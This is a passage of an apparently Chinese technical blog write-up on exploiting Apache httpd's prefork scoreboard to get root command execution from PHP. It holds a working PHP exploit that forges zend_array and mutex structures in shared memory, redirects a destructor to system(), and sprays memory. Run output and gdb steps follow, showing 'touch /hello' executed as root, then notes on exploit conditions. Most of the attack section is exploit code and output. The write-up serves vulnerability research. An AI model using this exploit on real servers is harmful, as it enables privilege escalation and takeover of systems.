<span class="k">echo</span> <span class="s2">&quot;properties(0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$properties</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;) =&gt; zend_array struct</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="nx">write_mem_qword</span><span class="p">(</span><span class="nv">$properties</span><span class="p">,</span><span class="nv">$evil_zend_array_start_addr</span><span class="p">);</span>

<span class="c1">//system 字符串 写入</span>
<span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$evil_string</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
    <span class="nv">$b</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$evil_string</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
    <span class="nx">write_mem</span><span class="p">(</span><span class="nv">$evil_string_start_addr</span><span class="o">+</span><span class="nv">$i</span><span class="p">,</span><span class="nv">$b</span><span class="p">);</span>
<span class="p">}</span>
<span class="nx">write_mem</span><span class="p">(</span><span class="nv">$evil_string_start_addr</span><span class="o">+</span><span class="nv">$i</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>

<span class="c1">//将zend_array中的arData指向system字符串</span>
<span class="nv">$ar_data</span> <span class="o">=</span> <span class="nv">$evil_zend_array_start_addr</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">&quot;ar_data(0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$ar_data</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;) =&gt; evil string</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="nx">write_mem_qword</span><span class="p">(</span><span class="nv">$ar_data</span><span class="p">,</span><span class="nv">$evil_string_start_addr</span><span class="p">);</span>

<span class="c1">//将zend_array中的nNumUsed设置为1，（自行分析代码去）</span>
<span class="nv">$nNumUsed</span> <span class="o">=</span> <span class="nv">$evil_zend_array_start_addr</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">;</span>
<span class="nx">write_mem_qword</span><span class="p">(</span><span class="nv">$nNumUsed</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>


<span class="c1">//堆喷</span>
<span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Spraying the shared memory start</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">;</span>

<span class="nv">$shm_region</span> <span class="o">=</span> <span class="nx">get_mem_region</span><span class="p">(</span><span class="s2">&quot;/dev/zero&quot;</span><span class="p">);</span>
<span class="nv">$evil_shm_start_addr</span> <span class="o">=</span> <span class="nv">$evil_string_end_addr</span><span class="p">;</span>
<span class="nv">$evil_shm_end_addr</span> <span class="o">=</span> <span class="nv">$shm_region</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">];</span>
<span class="nv">$evil_shm_size</span> <span class="o">=</span> <span class="nv">$evil_shm_end_addr</span> <span class="o">-</span> <span class="nv">$evil_shm_start_addr</span><span class="p">;</span>

<span class="nv">$evil_shm_mid_addr</span> <span class="o">=</span> <span class="nv">$evil_shm_start_addr</span> <span class="o">+</span> <span class="mi">8</span><span class="o">*</span><span class="p">((</span><span class="nx">int</span><span class="p">)(((</span><span class="nx">int</span><span class="p">)(</span><span class="nv">$evil_shm_size</span><span class="o">/</span><span class="mi">2</span><span class="p">))</span><span class="o">/</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>

<span class="k">echo</span> <span class="s2">&quot;evil_shm_start:0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$evil_shm_start_addr</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">&quot;evil_shm_end:0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$evil_shm_end_addr</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">&quot;evil_shm_size:&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$evil_shm_size</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>

<span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nv">$evil_shm_size</span><span class="p">;</span><span class="nv">$i</span><span class="o">+=</span><span class="mi">8</span><span class="p">){</span>
    <span class="nx">write_mem_qword</span><span class="p">(</span><span class="nv">$evil_shm_start_addr</span><span class="o">+</span><span class="nv">$i</span><span class="p">,</span><span class="nv">$evil_zend_array_start_addr</span><span class="p">);</span>
<span class="p">}</span>


<span class="k">echo</span> <span class="s2">&quot;evil_shm_mid_addr:0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$evil_shm_mid_addr</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>

<span class="k">echo</span> <span class="s2">&quot;bucket:&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$bucket</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</code></pre></div>

<p>利用成功时，会在根目录下，创建hello文件</p>
<h4 id="_10">步骤<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h4>
<h5 id="_11">根目录显示<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h5>
<div class="codehilite"><pre><span></span><code><span class="err">➜</span><span class="w">  </span><span class="o">~</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">/</span>
<span class="n">bin</span><span class="w">  </span><span class="n">boot</span><span class="w">  </span><span class="n">dev</span><span class="w">  </span><span class="n">etc</span><span class="w">  </span><span class="n">home</span><span class="w">  </span><span class="n">lib</span><span class="w">  </span><span class="n">lib64</span><span class="w">  </span><span class="n">media</span><span class="w">  </span><span class="n">mnt</span><span class="w">  </span><span class="n">opt</span><span class="w">  </span><span class="n">proc</span><span class="w">  </span><span class="n">root</span><span class="w">  </span><span class="n">run</span><span class="w">  </span><span class="n">sbin</span><span class="w">  </span><span class="n">srv</span><span class="w">  </span><span class="n">sys</span><span class="w">  </span><span class="n">tmp</span><span class="w">  </span><span class="n">usr</span><span class="w">  </span><span class="k">var</span><span class="w">  </span><span class="n">www</span>
</code></pre></div>

<h5 id="php_2">让服务器执行恶意php代码<a class="headerlink" href="#php_2" title="Permanent link">&para;</a></h5>
<div class="codehilite"><pre><span></span><code><span class="err">➜</span><span class="w">  </span><span class="o">~</span><span class="w"> </span><span class="nx">curl</span><span class="w"> </span><span class="m m-Double">127.0.0.1</span>
<span class="nx">PID</span><span class="p">:</span><span class="w"> </span><span class="mi">19896</span>
<span class="o">/</span><span class="nx">dev</span><span class="o">/</span><span class="nx">zero</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="kd">addr</span><span class="p">:</span><span class="mh">0x7f1f62a32000</span>
<span class="o">/</span><span class="nx">dev</span><span class="o">/</span><span class="nx">zero</span><span class="w"> </span><span class="nx">end</span><span class="w"> </span><span class="kd">addr</span><span class="p">:</span><span class="mh">0x7f1f62a4a000</span>
<span class="kp">self</span><span class="w"> </span><span class="nx">parent</span><span class="w"> </span><span class="nx">struct</span><span class="w"> </span><span class="kd">addr</span><span class="p">:</span><span class="mh">0x7f1f62a32040</span>
<span class="nx">parent</span><span class="w"> </span><span class="nx">arr</span><span class="w"> </span><span class="kd">addr</span><span class="p">:</span><span class="mh">0x7f1f62a32040</span>
<span class="nx">heap</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="kd">addr</span><span class="p">:</span><span class="mh">0xf59000</span>
<span class="nx">heap</span><span class="w"> </span><span class="nx">end</span><span class="w"> </span><span class="kd">addr</span><span class="p">:</span><span class="mh">0x1022000</span>
<span class="nx">libapr</span><span class="w"> </span><span class="nx">text</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="kd">addr</span><span class="p">:</span><span class="mh">0x7f1f61ffa000</span>
<span class="nx">libapr</span><span class="w"> </span><span class="nx">text</span><span class="w"> </span><span class="nx">end</span><span class="w"> </span><span class="kd">addr</span><span class="p">:</span><span class="mh">0x7f1f6202f000</span>
<span class="nx">libapr</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="kd">addr</span><span class="p">:</span><span class="mh">0x7f1f6222e000</span>
<span class="nx">libapr</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="nx">end</span><span class="w"> </span><span class="kd">addr</span><span class="p">:</span><span class="mh">0x7f1f6222f000</span>
<span class="nx">all_buckets</span><span class="w"> </span><span class="kd">addr</span><span class="p">:</span><span class="mh">0xff0c18</span>
<span class="nx">evil</span><span class="w"> </span><span class="nx">prefork_child_bucket</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="kd">addr</span><span class="p">:</span><span class="mh">0x7f1f62a321a8</span>
<span class="nx">evil</span><span class="w"> </span><span class="nx">prefork_child_bucket</span><span class="w"> </span><span class="nx">end</span><span class="w"> </span><span class="kd">addr</span><span class="p">:</span><span class="mh">0x7f1f62a321e0</span>
<span class="nx">evil</span><span class="w"> </span><span class="nx">zend_array</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="kd">addr</span><span class="p">:</span><span class="mh">0x7f1f62a321e0</span>
<span class="nx">evil</span><span class="w"> </span><span class="nx">zend_array</span><span class="w"> </span><span class="nx">end</span><span class="w"> </span><span class="kd">addr</span><span class="p">:</span><span class="mh">0x7f1f62a32218</span>
<span class="nx">evil</span><span class="w"> </span><span class="nx">mutex_methods</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="kd">addr</span><span class="p">:</span><span class="mh">0x7f1f62a32218</span>
<span class="nx">evil</span><span class="w"> </span><span class="nx">mutex_methods</span><span class="w"> </span><span class="nx">end</span><span class="w"> </span><span class="kd">addr</span><span class="p">:</span><span class="mh">0x7f1f62a32268</span>
<span class="nx">evil</span><span class="w"> </span><span class="kt">string</span><span class="p">:</span><span class="w"> </span><span class="nx">touch</span><span class="w"> </span><span class="o">/</span><span class="nx">hello</span><span class="w"> </span><span class="nx">len</span><span class="p">:</span><span class="mi">16</span>
<span class="nx">evil</span><span class="w"> </span><span class="kt">string</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="kd">addr</span><span class="p">:</span><span class="mh">0x7f1f62a32268</span>
<span class="nx">evil</span><span class="w"> </span><span class="kt">string</span><span class="w"> </span><span class="nx">end</span><span class="w"> </span><span class="kd">addr</span><span class="p">:</span><span class="mh">0x7f1f62a32278</span>
<span class="nx">zend_object_std_dtor</span><span class="w"> </span><span class="nx">function</span><span class="w"> </span><span class="kd">addr</span><span class="p">:</span><span class="mh">0x7f1f5c03d300</span>
<span class="nx">system</span><span class="w"> </span><span class="nx">function</span><span class="w"> </span><span class="kd">addr</span><span class="p">:</span><span class="mh">0x7f1f617a94c0</span>
<span class="nx">child_init</span><span class="p">(</span><span class="mh">0x7f1f62a32248</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="nx">zend_object_std_dtor</span>
<span class="nx">pDestructor</span><span class="p">(</span><span class="mh">0x7f1f62a32210</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="nx">system</span>
<span class="nx">meth</span><span class="p">(</span><span class="mh">0x7f1f62a321e8</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="nx">mutex_mthods_struct</span>
<span class="nx">mutex</span><span class="p">(</span><span class="mh">0x7f1f62a321b8</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="nx">zend_array</span><span class="w"> </span><span class="nx">struct</span>
<span class="nx">properties</span><span class="p">(</span><span class="mh">0x7f1f62a321d8</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="nx">zend_array</span><span class="w"> </span><span class="nx">struct</span>
<span class="nx">ar_data</span><span class="p">(</span><span class="mh">0x7f1f62a321f0</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="nx">evil</span><span class="w"> </span><span class="kt">string</span>

<span class="nx">Spraying</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">shared</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">start</span>

<span class="nx">evil_shm_start</span><span class="p">:</span><span class="mh">0x7f1f62a32278</span>
<span class="nx">evil_shm_end</span><span class="p">:</span><span class="mh">0x7f1f62a4a000</span>
<span class="nx">evil_shm_size</span><span class="p">:</span><span class="mi">17</span><span class="nx">d88</span>
<span class="nx">evil_shm_mid_addr</span><span class="p">:</span><span class="mh">0x7f1f62a3e140</span>
<span class="nx">bucket</span><span class="p">:</span><span class="nx">fe3ec349aa5</span>
</code></pre></div>

<p>此时，共享内存中，已经被我们的恶意数据给填充。</p>
<h5 id="gdbbucket_1">为通过gdb模拟修改bucket指向我们的恶意结构做准备<a class="headerlink" href="#gdbbucket_1" title="Permanent link">&para;</a></h5>
<div class="codehilite"><pre><span></span><code><span class="o">[</span><span class="n">root@bogon john</span><span class="o">]</span><span class="err">#</span><span class="w"> </span><span class="n">ps</span><span class="w"> </span><span class="o">-</span><span class="n">aux</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="n">httpd</span>
<span class="n">root</span><span class="w">      </span><span class="mi">19895</span><span class="w">  </span><span class="mf">0.0</span><span class="w">  </span><span class="mf">0.2</span><span class="w"> </span><span class="mi">285296</span><span class="w"> </span><span class="mi">10652</span><span class="w"> </span><span class="vm">?</span><span class="w">        </span><span class="n">Ss</span><span class="w">   </span><span class="mi">14</span><span class="err">:</span><span class="mi">27</span><span class="w">   </span><span class="mi">0</span><span class="err">:</span><span class="mi">00</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">httpd</span><span class="o">//</span><span class="n">bin</span><span class="o">/</span><span class="n">httpd</span><span class="w"> </span><span class="o">-</span><span class="n">k</span><span class="w"> </span><span class="k">start</span>
<span class="n">www</span><span class="w">       </span><span class="mi">19896</span><span class="w">  </span><span class="mf">0.0</span><span class="w">  </span><span class="mf">0.2</span><span class="w"> </span><span class="mi">287512</span><span class="w">  </span><span class="mi">9348</span><span class="w"> </span><span class="vm">?</span><span class="w">        </span><span class="n">S</span><span class="w">    </span><span class="mi">14</span><span class="err">:</span><span class="mi">27</span><span class="w">   </span><span class="mi">0</span><span class="err">:</span><span class="mi">00</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">httpd</span><span class="o">//</span><span class="n">bin</span><span class="o">/</span><span class="n">httpd</span><span class="w"> </span><span class="o">-</span><span class="n">k</span><span class="w"> </span><span class="k">start</span>
<span class="n">www</span><span class="w">       </span><span class="mi">19897</span><span class="w">  </span><span class="mf">0.0</span><span class="w">  </span><span class="mf">0.1</span><span class="w"> </span><span class="mi">287512</span><span class="w">  </span><span class="mi">7616</span><span class="w"> </span><span class="vm">?</span><span class="w">        </span><span class="n">S</span><span class="w">    </span><span class="mi">14</span><span class="err">:</span><span class="mi">27</span><span class="w">   </span><span class="mi">0</span><span class="err">:</span><span class="mi">00</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">httpd</span><span class="o">//</span><span class="n">bin</span><span class="o">/</span><span class="n">httpd</span><span class="w"> </span><span class="o">-</span><span class="n">k</span><span class="w"> </span><span class="k">start</span>
<span class="n">www</span><span class="w">       </span><span class="mi">19898</span><span class="w">  </span><span class="mf">0.0</span><span class="w">  </span><span class="mf">0.1</span><span class="w"> </span><span class="mi">287512</span><span class="w">  </span><span class="mi">7616</span><span class="w"> </span><span class="vm">?</span><span class="w">        </span><span class="n">S</span><span class="w">    </span><span class="mi">14</span><span class="err">:</span><span class="mi">27</span><span class="w">   </span><span class="mi">0</span><span class="err">:</span><span class="mi">00</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">httpd</span><span class="o">//</span><span class="n">bin</span><span class="o">/</span><span class="n">httpd</span><span class="w"> </span><span class="o">-</span><span class="n">k</span><span class="w"> </span><span class="k">start</span>
<span class="n">www</span><span class="w">       </span><span class="mi">19899</span><span class="w">  </span><span class="mf">0.0</span><span class="w">  </span><span class="mf">0.1</span><span class="w"> </span><span class="mi">287512</span><span class="w">  </span><span class="mi">7616</span><span class="w"> </span><span class="vm">?</span><span class="w">        </span><span class="n">S</span><span class="w">    </span><span class="mi">14</span><span class="err">:</span><span class="mi">27</span><span class="w">   </span><span class="mi">0</span><span class="err">:</span><span class="mi">00</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">httpd</span><span class="o">//</span><span class="n">bin</span><span class="o">/</span><span class="n">httpd</span><span class="w"> </span><span class="o">-</span><span class="n">k</span><span class="w"> </span><span class="k">start</span>
<span class="n">www</span><span class="w">       </span><span class="mi">19900</span><span class="w">  </span><span class="mf">0.0</span><span class="w">  </span><span class="mf">0.1</span><span class="w"> </span><span class="mi">287512</span><span class="w">  </span><span class="mi">7616</span><span class="w"> </span><span class="vm">?</span><span class="w">        </span><span class="n">S</span><span class="w">    </span><span class="mi">14</span><span class="err">:</span><span class="mi">27</span><span class="w">   </span><span class="mi">0</span><span class="err">:</span><span class="mi">00</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">httpd</span><span class="o">//</span><span class="n">bin</span><span class="o">/</span><span class="n">httpd</span><span class="w"> </span><span class="o">-</span><span class="n">k</span><span class="w"> </span><span class="k">start</span>
<span class="n">root</span><span class="w">      </span><span class="mi">20112</span><span class="w">  </span><span class="mf">0.0</span><span class="w">  </span><span class="mf">0.0</span><span class="w"> </span><span class="mi">112708</span><span class="w">   </span><span class="mi">980</span><span class="w"> </span><span class="n">pts</span><span class="o">/</span><span class="mi">2</span><span class="w">    </span><span class="n">R</span><span class="o">+</span><span class="w">   </span><span class="mi">14</span><span class="err">:</span><span class="mi">30</span><span class="w">   </span><span class="mi">0</span><span class="err">:</span><span class="mi">00</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="c1">--color=auto httpd</span>
<span class="o">[</span><span class="n">root@bogon john</span><span class="o">]</span><span class="err">#</span><span class="w"> </span><span class="n">gdb</span><span class="w"> </span><span class="n">attach</span><span class="w"> </span><span class="mi">19895</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span><span class="w"> </span><span class="k">break</span><span class="w"> </span><span class="n">child_main</span>
<span class="n">Breakpoint</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mh">0x46c000</span><span class="err">:</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="n">prefork</span><span class="p">.</span><span class="n">c</span><span class="p">,</span><span class="w"> </span><span class="n">line</span><span class="w"> </span><span class="mf">380.</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="n">follow</span><span class="o">-</span><span class="n">fork</span><span class="o">-</span><span class="n">mode</span><span class="w"> </span><span class="n">child</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span><span class="w"> </span><span class="n">c</span>
</code></pre></div>

<h5 id="apachectl-graceful">执行apachectl graceful，使其优雅重启<a class="headerlink" href="#apachectl-graceful" title="Permanent link">&para;</a></h5>
<div class="codehilite"><pre><span></span><code><span class="o">[</span><span class="n">root@bogon john</span><span class="o">]</span><span class="err">#</span><span class="w"> </span><span class="n">apachectl</span><span class="w"> </span><span class="n">graceful</span>
<span class="o">[</span><span class="n">root@bogon john</span><span class="o">]</span><span class="err">#</span>
</code></pre></div>

<h5 id="my_bucket">修改my_bucket<a class="headerlink" href="#my_bucket" title="Permanent link">&para;</a></h5>
<p>我们将my_bucket，设置为0x7f1f62a3e140，该地址是执行恶意PHP代码时，输出的evil_shm_mid_addr</p>
<div class="codehilite"><pre><span></span><code><span class="n">Continuing</span><span class="o">.</span>

<span class="n">Program</span><span class="w"> </span><span class="n">received</span><span class="w"> </span><span class="k">signal</span><span class="w"> </span><span class="n">SIGUSR1</span><span class="p">,</span><span class="w"> </span><span class="n">User</span><span class="w"> </span><span class="n">defined</span><span class="w"> </span><span class="k">signal</span><span class="w"> </span><span class="mf">1.</span>
<span class="mh">0x00007f1f612bdf53</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">__select_nocancel</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">6</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span><span class="w"> </span><span class="n">c</span>
<span class="n">Continuing</span><span class="o">.</span>
<span class="p">[</span><span class="n">New</span><span class="w"> </span><span class="n">process</span><span class="w"> </span><span class="mi">20155</span><span class="p">]</span>
<span class="p">[</span><span class="n">Thread</span><span class="w"> </span><span class="n">debugging</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">libthread_db</span><span class="w"> </span><span class="n">enabled</span><span class="p">]</span>
<span class="n">Using</span><span class="w"> </span><span class="n">host</span><span class="w"> </span><span class="n">libthread_db</span><span class="w"> </span><span class="n">library</span><span class="w"> </span><span class="s2">&quot;/lib64/libthread_db.so.1&quot;</span><span class="o">.</span>
<span class="p">[</span><span class="n">Switching</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">Thread</span><span class="w"> </span><span class="mh">0x7f1f62ae9780</span><span class="w"> </span><span class="p">(</span><span class="n">LWP</span><span class="w"> </span><span class="mi">20155</span><span class="p">)]</span>

<span class="n">Breakpoint</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">child_main</span><span class="w"> </span><span class="p">(</span><span class="n">child_num_arg</span><span class="o">=</span><span class="n">child_num_arg</span><span class="err">@</span><span class="n">entry</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">child_bucket</span><span class="o">=</span><span class="n">child_bucket</span><span class="err">@</span><span class="n">entry</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">prefork</span><span class="o">.</span><span class="n">c</span><span class="p">:</span><span class="mi">380</span>
<span class="mi">380</span><span class="w">    </span><span class="p">{</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">my_bucket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x7f1f62a3e140</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span><span class="w"> </span><span class="n">c</span>
<span class="n">Continuing</span><span class="o">.</span>
<span class="p">[</span><span class="n">New</span><span class="w"> </span><span class="n">process</span><span class="w"> </span><span class="mi">20177</span><span class="p">]</span>
<span class="p">[</span><span class="n">Thread</span><span class="w"> </span><span class="n">debugging</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">libthread_db</span><span class="w"> </span><span class="n">enabled</span><span class="p">]</span>
<span class="n">Using</span><span class="w"> </span><span class="n">host</span><span class="w"> </span><span class="n">libthread_db</span><span class="w"> </span><span class="n">library</span><span class="w"> </span><span class="s2">&quot;/lib64/libthread_db.so.1&quot;</span><span class="o">.</span>
<span class="n">process</span><span class="w"> </span><span class="mi">20177</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">executing</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">program</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">Error</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">re</span><span class="o">-</span><span class="n">setting</span><span class="w"> </span><span class="k">breakpoint</span><span class="w"> </span><span class="mi">1</span><span class="p">:</span><span class="w"> </span><span class="n">Function</span><span class="w"> </span><span class="s2">&quot;child_main&quot;</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">defined</span><span class="o">.</span>
<span class="n">process</span><span class="w"> </span><span class="mi">20177</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">executing</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">program</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">touch</span>
<span class="n">Missing</span><span class="w"> </span><span class="n">separate</span><span class="w"> </span><span class="n">debuginfos</span><span class="p">,</span><span class="w"> </span><span class="n">use</span><span class="p">:</span><span class="w"> </span><span class="n">debuginfo</span><span class="o">-</span><span class="n">install</span><span class="w"> </span><span class="n">bash</span><span class="o">-</span><span class="mf">4.2</span><span class="o">.</span><span class="mi">46</span><span class="o">-</span><span class="mf">31.</span><span class="n">el7</span><span class="o">.</span><span class="n">x86_64</span>
<span class="p">[</span><span class="n">Inferior</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="p">(</span><span class="n">process</span><span class="w"> </span><span class="mi">20177</span><span class="p">)</span><span class="w"> </span><span class="n">exited</span><span class="w"> </span><span class="n">normally</span><span class="p">]</span>
<span class="n">Missing</span><span class="w"> </span><span class="n">separate</span><span class="w"> </span><span class="n">debuginfos</span><span class="p">,</span><span class="w"> </span><span class="n">use</span><span class="p">:</span><span class="w"> </span><span class="n">debuginfo</span><span class="o">-</span><span class="n">install</span><span class="w"> </span><span class="n">coreutils</span><span class="o">-</span><span class="mf">8.22</span><span class="o">-</span><span class="mf">23.</span><span class="n">el7</span><span class="o">.</span><span class="n">x86_64</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
</code></pre></div>

<h5 id="_12">查看根目录，发现利用成功<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h5>
<div class="codehilite"><pre><span></span><code><span class="err">➜</span><span class="w">  </span><span class="o">~</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">/</span>
<span class="n">bin</span><span class="w">  </span><span class="n">boot</span><span class="w">  </span><span class="n">dev</span><span class="w">  </span><span class="n">etc</span><span class="w">  </span><span class="n">hello</span><span class="w">  </span><span class="n">home</span><span class="w">  </span><span class="n">lib</span><span class="w">  </span><span class="n">lib64</span><span class="w">  </span><span class="n">media</span><span class="w">  </span><span class="n">mnt</span><span class="w">  </span><span class="n">opt</span><span class="w">  </span><span class="n">proc</span><span class="w">  </span><span class="n">root</span><span class="w">  </span><span class="n">run</span><span class="w">  </span><span class="n">sbin</span><span class="w">  </span><span class="n">srv</span><span class="w">  </span><span class="n">sys</span><span class="w">  </span><span class="n">tmp</span><span class="w">  </span><span class="n">usr</span><span class="w">  </span><span class="k">var</span><span class="w">  </span><span class="n">www</span>
</code></pre></div>

<h4 id="exp">EXP分析<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h4>
<p>1.在作者提供的Exp中，没有依赖具体的硬编码数值。在get_all_address函数中利用
/proc/self/maps和文件读取的方式定位到了如下shm, system, libaprR,
libaprX, apache,
zend_object_std_dtor几个函数的地址以及共享内存起始地址。</p>
<p>2.在get_workers_pids中通过枚举/proc/<em>/cmdline and
/proc/</em>/status文件，得到所有worker进程的PID，用于后续在共享内存中定位process_score地址。</p>
<p>3.最终在real函数中，作者通过在共享内存中查找worker
process的PID从而定位到每个process_score结构，并利用被UAF漏洞修改过的字符串对内存进行修改。利用内存模式匹配找到all_buckets的起始位置，并复用了
在scoreboard中空闲的servers结构保存生成的payload。最后利用在2步中获取的worker进程id找到所有的process_score，将其中的bucket修改成指定可利用的值。</p>
<h3 id="_13">补充<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
<p>关于需要开始ssl模块说明：</p>
<ol>
<li>
<p>就算不开ssl模块，漏洞也是存在的</p>
</li>
<li>
<p>就算不开启ssl模块，你自己修改apache配置，能开启其他端口，也是能利用的</p>
</li>
<li>
<p>如果只开了80端口，则需要另行找一条利用链，github上公布exp在只开启了一个端口的情况下是无效的</p>
</li>
<li>
<p>\@cfreal的文章中已经说了，我这里在多说句，相关代码可以看看<a href="https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L433">1</a>和<a href="https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L1223">2</a>还有<code>SAFE_ACCPET</code>的宏定义：</p>
</li>
</ol>
<p><div class="highlight"><pre><span></span><code>&lt;!-- --&gt;
</code></pre></div>
    <span class="cm">/* On some architectures it's safe to do unserialized accept()s in the single</span>
    <span class="cm"> * Listen case.  But it's never safe to do it in the case where there's</span>
